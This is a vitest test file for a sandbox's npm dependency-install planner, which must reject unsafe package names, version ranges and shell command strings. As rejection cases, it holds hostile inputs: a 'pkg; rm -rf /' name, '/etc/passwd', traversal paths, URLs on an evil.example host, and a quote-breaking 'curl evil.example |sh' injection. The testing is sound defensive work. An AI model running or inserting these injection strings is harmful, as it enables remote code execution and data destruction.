/**
 * Tests for the dependency-install plan.
 *
 * These assert two different things, and the distinction matters. Most of the
 * file is about correctness — the right packages get installed and the wrong
 * ones get a reason. The `buildInstallCommand` block is a security boundary:
 * those strings are written by a language model from a stranger's prompt and
 * end up in a shell, during the one phase of the container's life when the
 * network is open.
 */
import { describe, it, expect } from 'vitest';
import type { ProjectFile } from '@bicameral/shared/types';
import {
  buildInstallCommand,
  declaredDependencies,
  CF_CA_SOURCE,
  MAX_DEPENDENCIES,
  PREINSTALLED_PACKAGES,
} from './sandbox-install.js';

function pkg(json: unknown, path = 'package.json'): ProjectFile[] {
  return [{ path, content: JSON.stringify(json) } as ProjectFile];
}

describe('declaredDependencies', () => {
  it('returns nothing when there is no package.json', () => {
    expect(
      declaredDependencies([{ path: 'App.jsx', content: '' } as ProjectFile])
    ).toEqual({ specs: [], skipped: [] });
  });

  it('reads ./package.json as well as package.json', () => {
    const plan = declaredDependencies(
      pkg({ dependencies: { zustand: '^5.0.0' } }, './package.json')
    );
    expect(plan.specs).toEqual(['zustand@^5.0.0']);
  });

  it('reports unparseable JSON instead of silently installing nothing', () => {
    const plan = declaredDependencies([
      { path: 'package.json', content: '{ not json' } as ProjectFile,
    ]);
    expect(plan.specs).toEqual([]);
    expect(plan.skipped).toHaveLength(1);
    expect(plan.skipped[0].reason).toMatch(/not valid JSON/);
  });

  it('skips the packages already baked into the image, without noise', () => {
    const plan = declaredDependencies(
      pkg({
        dependencies: {
          react: '^19.0.0',
          'react-dom': '^19.0.0',
          vite: '^6.0.0',
          '@vitejs/plugin-react': '^4.0.0',
          zustand: '^5.0.0',
        },
      })
    );
    expect(plan.specs).toEqual(['zustand@^5.0.0']);
    // A preinstalled package is not a problem the founder needs to hear about.
    expect(plan.skipped).toEqual([]);
    for (const name of PREINSTALLED_PACKAGES) {
      expect(plan.specs.some((s) => s.startsWith(`${name}@`))).toBe(false);
    }
  });

  it('ignores devDependencies', () => {
    const plan = declaredDependencies(
      pkg({
        dependencies: { zustand: '^5.0.0' },
        devDependencies: { vitest: '^3.0.0', eslint: '^9.0.0' },
      })
    );
    expect(plan.specs).toEqual(['zustand@^5.0.0']);
  });

  it('accepts scoped names and the ranges generated package.json files use', () => {
    const plan = declaredDependencies(
      pkg({
        dependencies: {
          '@tanstack/react-query': '^5.59.0',
          'date-fns': 'latest',
          clsx: '*',
          zod: '3.23.8',
          recharts: '>=2.12 <3',
        },
      })
    );
    expect(plan.skipped).toEqual([]);
    expect(plan.specs).toEqual([
      '@tanstack/react-query@^5.59.0',
      'date-fns@latest',
      'clsx@*',
      'zod@3.23.8',
      'recharts@>=2.12 <3',
    ]);
  });

  // The non-registry install forms. Each of these is a way to make npm fetch
  // code from somewhere the egress allowlist does not cover, written in the
  // place a version number goes.
  it.each([
    ['git URL', 'git+https://github.com/attacker/pkg.git'],
    ['github shorthand', 'github:attacker/pkg'],
    ['tarball URL', 'https://evil.example/pkg.tgz'],
    ['local path', 'file:../../../etc'],
    ['npm alias', 'npm:other-package@1.0.0'],
  ])('refuses a %s in place of a version range', (_label, range) => {
    const plan = declaredDependencies(pkg({ dependencies: { pkg: range } }));
    expect(plan.specs).toEqual([]);
    expect(plan.skipped[0]).toMatchObject({ name: 'pkg' });
    expect(plan.skipped[0].reason).toMatch(/not a registry version range/);
  });

  it('refuses a non-string version', () => {
    const plan = declaredDependencies(
      pkg({ dependencies: { pkg: { version: '1.0.0' } } })
    );
    expect(plan.specs).toEqual([]);
    expect(plan.skipped).toHaveLength(1);
  });

  it.each([
    ['a path traversal', '../../evil'],
    ['a shell metacharacter', 'pkg; rm -rf /'],
    ['a leading dot', '.hidden'],
    ['an absolute path', '/etc/passwd'],
    ['a URL', 'https://evil.example'],
  ])('refuses %s as a package name', (_label, name) => {
    const plan = declaredDependencies(
      pkg({ dependencies: { [name]: '1.0.0' } })
    );
    expect(plan.specs).toEqual([]);
    expect(plan.skipped[0].reason).toMatch(/not a valid npm package name/);
  });

  it('caps a runaway dependency list and says which ones it dropped', () => {
    const deps: Record<string, string> = {};
    for (let i = 0; i < MAX_DEPENDENCIES + 5; i += 1)
      deps[`pkg-${i}`] = '1.0.0';

    const plan = declaredDependencies(pkg({ dependencies: deps }));
    expect(plan.specs).toHaveLength(MAX_DEPENDENCIES);
    expect(plan.skipped).toHaveLength(5);
    expect(plan.skipped[0].reason).toMatch(
      new RegExp(`${MAX_DEPENDENCIES}-dependency limit`)
    );
  });
});

describe('buildInstallCommand', () => {
  it('refuses to build a command with nothing to install', () => {
    // Silently emitting `npm install` with no arguments would install the
    // whole of package.json, bypassing every filter above.
    expect(() => buildInstallCommand([], '/app')).toThrow(/no packages/);
  });

  it('runs npm with scripts disabled', () => {
    // The load-bearing flag: a postinstall script is arbitrary code from a
    // model-chosen package, executing while egress is open.
    expect(buildInstallCommand(['zustand@^5'], '/app')).toContain(
      '--ignore-scripts'
    );
  });

  it('makes no extra registry calls', () => {
    const cmd = buildInstallCommand(['zustand@^5'], '/app');
    expect(cmd).toContain('--no-audit');
    expect(cmd).toContain('--no-fund');
  });

  it('installs into the project workdir, not wherever exec lands', () => {
    // exec() starts in "/" regardless of the image's WORKDIR — the same fact
    // that once rooted Vite at the filesystem root.
    expect(buildInstallCommand(['zustand@^5'], '/app')).toContain('cd /app &&');
  });

  it('trusts the interception CA before npm opens a TLS connection', () => {
    const cmd = buildInstallCommand(['zustand@^5'], '/app');
    expect(cmd.indexOf(CF_CA_SOURCE)).toBeLessThan(cmd.indexOf('npm install'));
    expect(cmd).toContain('update-ca-certificates');
    expect(cmd).toContain(`NODE_EXTRA_CA_CERTS=${CF_CA_SOURCE}`);
  });

  it('single-quotes every spec', () => {
    const cmd = buildInstallCommand(
      ['zustand@^5.0.0', '@scope/pkg@1.x'],
      '/app'
    );
    expect(cmd).toContain("'zustand@^5.0.0'");
    expect(cmd).toContain("'@scope/pkg@1.x'");
  });

  it('throws rather than emitting a spec that could close the quoting', () => {
    // declaredDependencies would never produce this. That is a claim about a
    // different function, and this is the boundary that has to hold on its own.
    expect(() =>
      buildInstallCommand(["pkg'; curl evil.example |sh; '"], '/app')
    ).toThrow(/cannot be safely passed to a shell/);
  });

  it('a spec containing a shell metacharacter stays inert inside the quotes', () => {
    // `$`, backticks and `;` survive NPM_RANGE in some forms; single quotes
    // make every one of them literal, which is why the quoting is the control
    // and the regex is the belt.
    const cmd = buildInstallCommand(['pkg@1.0.0'], '/app');
    const specSegment = cmd.slice(cmd.indexOf("'pkg@1.0.0'"));
    expect(specSegment.startsWith("'pkg@1.0.0'")).toBe(true);
  });
});

describe('the two halves fit together', () => {
  it('every spec declaredDependencies produces is one buildInstallCommand accepts', () => {
    const plan = declaredDependencies(
      pkg({
        dependencies: {
          '@tanstack/react-query': '^5.59.0',
          'date-fns': 'latest',
          zod: '3.23.8',
        },
      })
    );
    expect(() => buildInstallCommand(plan.specs, '/app')).not.toThrow();
  });
});
